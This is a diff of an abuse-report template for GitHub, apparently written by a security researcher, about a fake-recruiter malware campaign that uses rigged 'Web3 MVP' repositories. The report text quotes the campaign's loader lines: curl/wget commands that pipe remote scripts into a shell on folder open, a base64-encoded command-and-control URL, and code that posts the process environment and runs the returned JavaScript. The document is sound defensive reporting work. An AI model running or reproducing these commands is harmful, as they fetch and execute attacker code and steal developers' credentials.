@@ -2,9 +2,20 @@
 
 This case warrants **six separate filings** through three of GitHub's abuse flows: one against the repository, three against the operator-controlled organizations, and two against the operator-controlled user accounts. GitHub routes abuse differently per entity type, and entity-level suspensions (orgs and users) usually need their own filings to be acted on.
 
-The full body is for the main repository filing. For each org and user filing, an abbreviated body is provided — those forms are smaller, and the analyst will cross-reference the main repo report.
+This file is a **copy-paste template**. Before submitting, replace the case-specific placeholders below with values from this incident's [case file](./README.md) (or from your direct knowledge of the repo you were pointed at). The campaign-wide indicators (operator-controlled organization names, user accounts, C2 hostnames, etc.) are already filled in because they're the same across the cluster.
 
-> On the rendered GitHub view of this file, hover over each `text` code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version. **For each filing, copy the matching subject + body code blocks below.**
+### Placeholders to fill in
+
+| Placeholder | What to put | Where to find it |
+|---|---|---|
+| `<YOUR_REPO_URL>` | Full URL of the repository you were pointed at, e.g. `https://github.com/<org>/<repo>` | The recruiter's link, or the case file's "Subject" line |
+| `<YOUR_REPO_OWNER>/<YOUR_REPO_NAME>` | The `org/repo` shorthand for the same repo | Same as above |
+| `<COMMIT_SHA>` | The full 40-char commit SHA you analyzed | `git log -1 --format=%H` on your local clone, or the head SHA on the GitHub page |
+| `<YOUR_NAME>` | Your name or GitHub handle, as you'd like it to appear on the report | (yourself) |
+
+The org and user filings (filings #2–#6) use their own per-entity placeholders (`<ORG>` and `<USER>`) — listed at the top of those code blocks.
+
+> On the rendered GitHub view of this file, hover over each `text` code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version. **For each filing, copy the matching subject + body code blocks and do the placeholder fill-in before pasting.**
 
 ---
 
@@ -14,7 +25,7 @@ Work top-down. The repo filing carries the full technical evidence; the org/user
 
 | # | Target | Type | Where to file | Use these code blocks |
 |---|---|---|---|---|
-| 1 | `AjunaWorkHub/AjunaVerse_MVP` (the repo I personally encountered; substitute whichever repo you got pitched) | Repo | https://github.com/contact/report-abuse → *"I want to report abuse or spam"* → *"Malware or exploits"* | [Subject — main](#subject--main-report) + [Body — main](#body--main-report) |
+| 1 | `<YOUR_REPO_URL>` (the repository you were pointed at) | Repo | https://github.com/contact/report-abuse → *"I want to report abuse or spam"* → *"Malware or exploits"* | [Subject — main](#subject--main-report) + [Body — main](#body--main-report) |
 | 2 | `AjunaWorkHub` | Org | https://github.com/AjunaWorkHub → click the **"…"** kebab menu near the top right → **"Report abuse"** (or use https://github.com/contact/report-content-or-abuse and paste the org URL) | [Subject — org](#subject--org-filings) + [Body — org](#body--org-filings) |
 | 3 | `AetSoftWorkHub` | Org | https://github.com/AetSoftWorkHub → **"…"** → **"Report abuse"** | [Subject — org](#subject--org-filings) + [Body — org](#body--org-filings) |
 | 4 | `DLabsHungary-Hub9` | Org | https://github.com/DLabsHungary-Hub9 → **"…"** → **"Report abuse"** | [Subject — org](#subject--org-filings) + [Body — org](#body--org-filings) |
@@ -27,7 +38,7 @@ If a UI label doesn't match exactly (GitHub does adjust placement), the fallback
 
 ## Which entities qualify for filing — and why
 
-The five entities in the table above are chosen because **each one shows multiple independent signals of being created specifically for this campaign**, not because they merely appear in our sibling-repo enumeration. Requesting suspension of an account that turns out to be a compromised legitimate developer's would be wrong and could harm the victim further — so the filter matters.
+The five named entities in the table above (three orgs, two users) are chosen because **each one shows multiple independent signals of being created specifically for this campaign**, not because they merely appear in our sibling-repo enumeration. Requesting suspension of an account that turns out to be a compromised legitimate developer's would be wrong and could harm the victim further — so the filter matters.
 
 The signals applied are:
 
@@ -50,9 +61,9 @@ Applied to the entities:
 
 ### What about the earlier-generation sibling repos?
 
-The earlier-generation repos in the main report's repo list (e.g. `prahaladbelavadi/CoinLocatorDemo`, `sky-cook/tokentradingdapp`, `WilliamSuhosky/Property-Voting-DApp`, `artemus-jarrett/blockchain-voting-system`, `Andrii-888/0gRollplay`, etc.) carry the loader code but their account histories are mixed. Some of these accounts have prior unrelated activity that's consistent with a legitimate developer whose account was later compromised and repurposed. **For those, we request repo takedown via the main report (filing #1) but explicitly *not* account suspension** — GitHub T&S should investigate each individually and pursue account recovery where appropriate.
+The earlier-generation repos catalogued in the main case file (e.g. `prahaladbelavadi/CoinLocatorDemo`, `sky-cook/tokentradingdapp`, `WilliamSuhosky/Property-Voting-DApp`, `artemus-jarrett/blockchain-voting-system`, `Andrii-888/0gRollplay`, etc.) carry the loader code but their account histories are mixed. Some of these accounts have prior unrelated activity that's consistent with a legitimate developer whose account was later compromised and repurposed. **For those, we request repo takedown via the main report (filing #1) but explicitly *not* account suspension** — GitHub T&S should investigate each individually and pursue account recovery where appropriate.
 
-If, while filing, you find clear evidence that one of those accounts *is* operator-controlled (e.g., the only activity is the campaign repo, naming pattern matches, etc.), add it to the user-filings list and use the user-filing template below.
+If, while filing, you find clear evidence that one of those accounts *is* operator-controlled (the only activity is the campaign repo, naming pattern matches, etc.), add it to the user-filings list and use the user-filing template below.
 
 ---
 
@@ -69,7 +80,7 @@ SUMMARY
 
 This is a CAMPAIGN-LEVEL abuse report covering an active, operationally-coordinated developer-targeting malware operation distributing remote-code-execution and credential-theft payloads via at least 15 GitHub repositories spread across multiple organizations and individual accounts. The repositories share an identical loader idiom and have been enumerated via GitHub code search on the distinctive strings "verify(setApiKey(process.env.AUTH_API))" and 'new Function("require", response.data)'. The TTPs match the publicly-documented "Contagious Interview" cluster (fake-recruiter cold outreach -> instruction to clone and run a "Web3 MVP" repository ahead of an interview -> compromise on first run).
 
-Reporting on behalf of: https://github.com/AjunaWorkHub/AjunaVerse_MVP (worked example; see "Technical mechanism" below). Cluster-wide takedown is the requested action.
+Reporting on behalf of: <YOUR_REPO_URL> (one of the cluster's known repositories). Cluster-wide takedown is the requested action.
 
 This report is paired with five additional per-entity filings (against three organizations: AjunaWorkHub, AetSoftWorkHub, DLabsHungary-Hub9; and two user accounts: GitWorkHub9, GitWorkHub99). Please cross-reference for cluster-wide handling.
 
@@ -103,17 +114,17 @@ Highest-confidence operator-controlled identities (appropriate targets for org/u
 - Org: AjunaWorkHub (GitHub id 276264331, created 2026-04-27)
 - Org: AetSoftWorkHub (GitHub id 276275397, created 2026-04-27 -- adjacent ID, same day, bit-identical .vscode/tasks.json)
 - Org: DLabsHungary-Hub9
-- User: GitWorkHub9 (id 272514006) -- sole committer to AjunaVerse_MVP, commit author email fatihafariya8+2@gmail.com (Gmail "+N" alias convention implies parallel personas)
+- User: GitWorkHub9 (id 272514006) -- sole committer to AjunaWorkHub/AjunaVerse_MVP, commit author email fatihafariya8+2@gmail.com (Gmail "+N" alias convention implies parallel personas)
 - User: GitWorkHub99 (id 213663943) -- approximately 20 "credibility farming" clones of widely-used open-source projects (llama.cpp, prettier, angular-cli, nuxt.com, Xray-core, etc.) plus a sibling campaign repo "AetSoftVerse"
 
 
-TECHNICAL MECHANISM (worked example: AjunaWorkHub/AjunaVerse_MVP at commit bac3362000a9332a490c763feb847995ea412b46)
+TECHNICAL MECHANISM (analyzed from <YOUR_REPO_URL> at commit <COMMIT_SHA>; the same loader pattern is present in every current-generation repo listed above)
 
 The repositories carry three INDEPENDENT code-execution vectors. Any one of them is sufficient to fully compromise a developer's workstation. They are redundant by design so that even if one is neutralized the others still fire.
 
 (1) VS Code tasks.json auto-run on folder open.
-    File: https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.vscode/tasks.json
-    Blob SHA: 998c34f02d94169a546b4c36123d552dd14f985b (BIT-IDENTICAL between AjunaVerse_MVP and AetSoft_MVP, proving operator coordination)
+    File: <YOUR_REPO_URL>/blob/<COMMIT_SHA>/.vscode/tasks.json
+    Campaign IOC: the same .vscode/tasks.json blob (git blob SHA 998c34f02d94169a546b4c36123d552dd14f985b) appears BIT-IDENTICAL in BOTH AjunaWorkHub/AjunaVerse_MVP AND AetSoftWorkHub/AetSoft_MVP, proving cross-org operator coordination.
     Defines a task with "runOn": "folderOpen" and these per-OS commands:
       osx:     curl -L 'https://vscode-settings-0506.vercel.app/api/settings/mac' | bash
       linux:   wget -qO- 'https://vscode-settings-0506.vercel.app/api/settings/linux' | sh
@@ -121,11 +132,11 @@ The repositories carry three INDEPENDENT code-execution vectors. Any one of them
     All output is suppressed ("reveal": "silent", "echo": false, "focus": false, "panel": "new", "close": true). The malicious lines are also padded with ~200 trailing spaces so the commands sit far off the right edge of a single line in any non-wrapping editor -- deliberate hide-in-plain-sight obfuscation.
 
 (2) package.json "prepare" lifecycle hook.
-    File: https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/package.json
+    File: <YOUR_REPO_URL>/blob/<COMMIT_SHA>/package.json
     Sets "prepare": "node server/server.js", which causes the in-repo Express server to launch during ordinary "npm install" (prepare is less notorious than postinstall and tends to escape security review). Additionally, all of start, build, test, and eject pipe "node server/server.js" into "react-scripts", so any normal "run the project" command also launches the malicious server.
 
 (3) Server boot-time process.env exfiltration + arbitrary Node RCE.
-    Files: https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/routes/api/auth.js (lines 18-36) and https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/controllers/auth.js (lines 67-72).
+    Files: <YOUR_REPO_URL>/blob/<COMMIT_SHA>/server/routes/api/auth.js and <YOUR_REPO_URL>/blob/<COMMIT_SHA>/server/controllers/auth.js
     On module load, the code POSTs { ...process.env } to a base64-obfuscated URL committed in .env as
       AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
     which decodes to https://ip-core-api-one.vercel.app/api, and then executes the response body as JS via "new Function('require', response.data)(require)". The injected "require" gives the attacker access to fs, child_process, etc. -- full arbitrary Node RCE running as the developer's user. The POST body is the developer's entire shell environment (any AWS_*, GITHUB_TOKEN, NPM_TOKEN, OPENAI_API_KEY, ANTHROPIC_API_KEY, etc. they have exported).
@@ -183,6 +194,11 @@ The campaign is documented by at least six independent researchers, satisfying a
 - nickgallick/perlantir-fleet -- references the campaign in a supply-chain-audit skill
 - S0AndS0/S0AndS0.github.io -- misc/_scammers/2026-04-10_Larry-Bogie-of-BitAngels-Investment-Group.md
 - jamesm-dev/NitroGem -- SECURITY_FINDINGS.md (captured loader file with annotations)
+
+
+REPORTED BY
+
+<YOUR_NAME>
 ```
 
 ---
@@ -197,7 +213,7 @@ Organization <ORG> is operator-controlled in an active multi-org developer-targe
 
 ## Body — org filings
 
-The same body is suitable for each org filing. Optionally, before submitting filing #N, replace `<ORG>` (and the parenthetical creation/id line) with the specifics of that org — the entity-specific signals are listed at the bottom of the body so the analyst sees them immediately.
+The same body works for each org filing. Before submitting, replace `<ORG>` with the specific org login — the entity-specific signals for each candidate are listed at the bottom of the body so the analyst sees them directly.
 
 ```text
 SUMMARY
@@ -228,6 +244,11 @@ The org is targeted for suspension because MULTIPLE INDEPENDENT SIGNALS indicate
 REQUESTED ACTION
 
 Suspend the organization <ORG> and take down its repositories. The main repo abuse filing covers the technical evidence and the full Acceptable Use Policy citation in detail.
+
+
+REPORTED BY
+
+<YOUR_NAME>
 ```
 
 ---
@@ -264,7 +285,7 @@ The user is targeted for suspension because MULTIPLE INDEPENDENT SIGNALS indicat
 - Account activity centers on operator-controlled repositories rather than independent development.
 
 For GitWorkHub9 (GitHub id 272514006) specifically:
-- Sole committer to AjunaWorkHub/AjunaVerse_MVP (the worked-example repo in the campaign).
+- Sole committer to AjunaWorkHub/AjunaVerse_MVP (a campaign repo).
 - Commit-author email "fatihafariya8+2@gmail.com" uses the Gmail "+N" alias convention. The "+2" suffix is the operator's persona-numbering bookkeeping and implies parallel personas at +1, +3, and beyond -- this is a strong fingerprint of multi-persona operator activity off a single inbox.
 
 For GitWorkHub99 (GitHub id 213663943) specifically:
@@ -276,6 +297,11 @@ For GitWorkHub99 (GitHub id 213663943) specifically:
 REQUESTED ACTION
 
 Suspend the user account <USER>. The main repo abuse filing covers the technical evidence and the full Acceptable Use Policy citation in detail.
+
+
+REPORTED BY
+
+<YOUR_NAME>
 ```
 
 ---
